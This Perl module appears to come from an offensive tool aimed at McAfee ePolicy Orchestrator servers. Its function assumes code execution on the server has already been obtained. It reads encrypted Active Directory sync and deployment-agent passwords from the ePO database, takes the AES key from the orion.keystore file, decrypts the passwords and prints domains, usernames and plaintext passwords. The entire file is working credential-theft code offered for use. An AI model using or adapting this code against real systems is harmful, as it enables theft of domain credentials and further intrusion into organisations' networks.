package Epowner::Epo;

#use MIME::Base64;
#use Digest::SHA qw(sha1);
#use URI::Escape;

use strict;
use warnings;



sub mode_domain_credentials {

	my $this = shift;


        # Do we have privileged code execution ?
        if(not $this->have_srv_exec_priv()){
                $this->print_err("[-] ERROR (mode_domain_credentials): You don't have sufficient RCE privileges to perform this action\n");
                exit;
        }


        # do we already know the installation path of ePo ?
        if(not $this->{force} and not length($this->{server_db_folder}) ne 0){
                $this->print_warn ("[-] WARNING: epo installation path is unknown. We know the default value but suggest you to\n");
                $this->print_warn ("             confirm it first using '--get-install-path'\n");
                $this->print_warn ("             You may also use '--force' to bypass this warning\n");
                exit;
        }


	# GET SyncDir entries from DB
	#=============================
	$this->print_info("\n[*] Getting Encrypted SyncDir credentials\n");
	my @syncdir = $this->mode_readdb_get_syncdir();
	if(@syncdir == 0){
		$this->print_warn ("[-] No SynDir passwords found in the database\n");
	} 

        # GET DeployAgent saved passwors
        #===============================
	$this->print_info("\n[*] Getting Encrypted DeployAgents credentials\n");
        my @deployagent = $this->mode_readdb_get_deployagent_creds();
        if(@deployagent == 0){
                $this->print_warn( "[-] No saved Deployment-Agents passwords found in the database\n");
        }


	if(@syncdir == 0 and @deployagent == 0 ){

		return;
	}

	# GET AES Key from keystore
	#============================
	$this->print_info("\n[*] Getting AES-128 Key from orion.keystore\n");
	$this->mode_gatherinfo_aes_key_from_orion_keystore();
	my $aes_key = pack("H*", $this->{aes_symkey_keystore});	


	# Decrypt SyncDir entries
	#========================
	if(@syncdir != 0){
		$this->print_info("\n[*] Decrypting Active Directory Sync password(s)\n");
		foreach my $sync (@syncdir){
			my ($host, $dom, $user, $pass_enc)  = split(/\|/, $sync);
			my $pass = $this->aes_ecb_decrypt(decode_base64($pass_enc), $aes_key);
			$this->print_data( "    **** Active Directory Sync Pass ****\n");
			$this->print_data( "    Domain    : $dom\n");
			$this->print_data( "    Username  : $user\n");
			$this->print_data( "    Password  : $pass\n");
	       }
	}

        # Decrypt DeployAgents entries
        #============================
	if(@deployagent != 0){
		
		$this->print_info("\n[*] Decrypting Deployment-Agent saved password(s)\n");
		foreach my $entry (@deployagent){
			my ($user, $pass_enc, $dom)  = split(/\|/, $entry);
			my $pass = $this->aes_ecb_decrypt(decode_base64($pass_enc), $aes_key);
			$this->print_data( "    **** Deployment Agents Pass ****\n");
			$this->print_data( "    Domain    : $dom\n");
			$this->print_data( "    Username  : $user\n");
			$this->print_data( "    Password  : $pass\n");
	       }
	}

	return 1;

}
1;
